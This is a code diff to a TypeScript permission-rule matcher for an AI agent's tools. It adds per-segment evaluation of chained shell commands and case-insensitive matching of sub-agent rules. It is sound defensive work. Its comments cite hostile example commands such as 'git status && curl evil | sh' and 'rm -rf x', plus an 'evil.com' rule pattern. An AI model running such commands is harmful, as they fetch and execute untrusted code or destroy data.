@@ -1,6 +1,6 @@
 import * as fs from "node:fs";
-import * as os from "node:os";
 import * as path from "node:path";
+import { canonicalToolKey } from "./tools/utils/official-names.js";
 import { ccrPath } from "./workspace-config.js";
 
 export interface PermissionPolicyConfig {
@@ -14,23 +14,12 @@ export interface PermissionPolicy {
   deny: string[];
   ask: string[];
 }
-const TOOL_ALIASES: Record<string, string> = {
-  webfetch: "web_fetch",
-  websearch: "web_search",
-  askuserquestion: "ask_user_question",
-  enterplanmode: "enter_plan_mode",
-  exitplanmode: "exit_plan_mode",
-  notebookedit: "notebook_edit",
-  multiedit: "multi_edit",
-  enterworktree: "enter_worktree",
-  exitworktree: "exit_worktree",
-  joboutput: "job_output",
-  jobkill: "job_kill",
-  joblist: "job_list",
-};
+// Tool-name comparison goes through the shared resolver so permission rules,
+// execution and tool visibility can never disagree about what a tool is called.
+// (Previously a hand-maintained alias table lived here only — a rule could match
+// a tool that execution then refused to find. See tools/utils/official-names.)
 function canonicalToolName(value: string): string {
-  const name = value.trim().toLowerCase();
-  return TOOL_ALIASES[name] ?? name;
+  return canonicalToolKey(value);
 }
 function urlRuleMatches(pattern: string, target: string): boolean {
   const mode = pattern.endsWith(":*") ? "boundary" : pattern.endsWith("*") ? "prefix" : "exact";
@@ -134,6 +123,16 @@ export function permissionRuleMatches(
   toolName: string,
   input: Record<string, unknown>,
 ): boolean {
+  // Official "Disable specific subagents": `Task(code-explorer)` /
+  // `Agent(code-explorer)` rules match the requested sub-agent TYPE, which
+  // lives in input.subagent_type (Agent tool) / input.subagent_name (task
+  // tool), not in command/filePath/url.
+  const agentType =
+    typeof input.subagent_type === "string"
+      ? input.subagent_type
+      : typeof input.subagent_name === "string"
+        ? input.subagent_name
+        : undefined;
   const target =
     typeof input.command === "string"
       ? input.command
@@ -141,7 +140,7 @@ export function permissionRuleMatches(
         ? input.filePath
         : typeof input.url === "string"
           ? input.url
-          : "";
+          : (agentType ?? "");
   const trimmed = rule.trim();
   if (trimmed === "*") return true;
   const name = canonicalToolName(toolName);
@@ -155,6 +154,12 @@ export function permissionRuleMatches(
   if (canonicalToolName(ruleTool) !== name) return false;
   const pattern = m[2]!;
   if (pattern === "*") return true;
+  // Sub-agent type names compare case-insensitively (registry names are
+  // lowercase; a rule may write "Task(Explore)"). Every other target keeps
+  // its case-sensitive semantics.
+  const subagentRule = agentType !== undefined && target === agentType;
+  const cmpPattern = subagentRule ? pattern.toLowerCase() : pattern;
+  const cmpTarget = subagentRule ? target.toLowerCase() : target;
   if (typeof input.url === "string" && target === input.url) return urlRuleMatches(pattern, target);
   // Official colon-prefix form: prefix match at a boundary. COMMAND rules
   // require a space after the prefix (`Bash(git:*)` must not also allow
@@ -163,9 +168,9 @@ export function permissionRuleMatches(
   // legitimately follow a host — "/", ":", "?", "#" — so `WebFetch(https://
   // evil.com:*)` matches "https://evil.com/x" instead of silently never
   // matching anything (fourth-round review).
-  if (pattern.endsWith(":*")) {
-    const prefix = pattern.slice(0, -2);
-    if (target === prefix) return true;
+  if (cmpPattern.endsWith(":*")) {
+    const prefix = cmpPattern.slice(0, -2);
+    if (cmpTarget === prefix) return true;
     const urlIsh = prefix.includes("://") || (!prefix.includes(" ") && /\.[A-Za-z]/.test(prefix));
     if (urlIsh && !prefix.includes("://")) {
       // Bare-host rule (`WebFetch(domain.com:*)`): the target carries a
@@ -194,14 +199,30 @@ export function permissionRuleMatches(
         return false;
       }
     }
-    if (!target.startsWith(prefix)) return false;
+    if (!cmpTarget.startsWith(prefix)) return false;
     if (prefix.endsWith(" ")) return true;
-    const next = target[prefix.length];
+    const next = cmpTarget[prefix.length];
     return prefix.includes("://") ? /[/:?#]/.test(next ?? "") : next === " ";
   }
   // Trailing-star wildcard: plain prefix match.
-  if (pattern.endsWith("*")) return target.startsWith(pattern.slice(0, -1));
-  return target === pattern;
+  if (cmpPattern.endsWith("*")) return cmpTarget.startsWith(cmpPattern.slice(0, -1));
+  return cmpTarget === cmpPattern;
+}
+
+/**
+ * Split a shell command into its operator-separated segments (&&, ||, ;, |).
+ * Returns single-element inputs unchanged for non-command tools. Splitting is
+ * deliberately quote-blind: an over-split only ever causes a re-prompt (safe
+ * direction), never a silent allow.
+ */
+function commandSegments(input: Record<string, unknown>): Record<string, unknown>[] {
+  if (typeof input.command !== "string") return [input];
+  const parts = input.command
+    .split(/\s*(?:&&|\|\||;|\|)\s*/)
+    .map((s) => s.trim())
+    .filter((s) => s !== "");
+  if (parts.length <= 1) return [input];
+  return parts.map((command) => ({ ...input, command }));
 }
 
 export function policyDecision(
@@ -210,9 +231,21 @@ export function policyDecision(
   input: Record<string, unknown>,
 ): "allow" | "deny" | "ask" | undefined {
   if (!policy) return undefined;
-  if (policy.deny.some((r) => permissionRuleMatches(r, toolName, input))) return "deny";
-  if (policy.ask.some((r) => permissionRuleMatches(r, toolName, input))) return "ask";
-  if (policy.allow.some((r) => permissionRuleMatches(r, toolName, input))) return "allow";
+  // Segment-aware evaluation (review fix): rules apply per command segment,
+  // not to the whole command line. Deny/ask fire when ANY segment matches
+  // (`echo ok && rm -rf x` must hit `Bash(rm *)`); allow fires only when EVERY
+  // segment is covered (`Bash(git *)` must not auto-allow
+  // `git status && curl evil | sh`).
+  const segments = commandSegments(input);
+  if (segments.some((seg) => policy.deny.some((r) => permissionRuleMatches(r, toolName, seg))))
+    return "deny";
+  if (segments.some((seg) => policy.ask.some((r) => permissionRuleMatches(r, toolName, seg))))
+    return "ask";
+  if (
+    policy.allow.length > 0 &&
+    segments.every((seg) => policy.allow.some((r) => permissionRuleMatches(r, toolName, seg)))
+  )
+    return "allow";
   return undefined;
 }
 
